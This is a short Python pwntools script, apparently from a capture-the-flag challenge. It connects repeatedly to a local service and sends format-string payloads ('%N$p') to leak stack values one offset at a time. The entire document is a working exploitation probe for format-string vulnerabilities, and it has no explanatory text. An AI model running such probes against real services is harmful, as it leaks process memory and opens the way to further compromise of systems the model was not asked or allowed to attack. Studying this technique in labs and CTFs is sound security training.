from pwn import *
elf = context.binary = ELF("./chall")
for i in range(100):
    p = remote("127.0.0.1",1470)
    p.sendline(f"{i} ==> %{i}$p")
    print(p.recv(9999))
    p.close()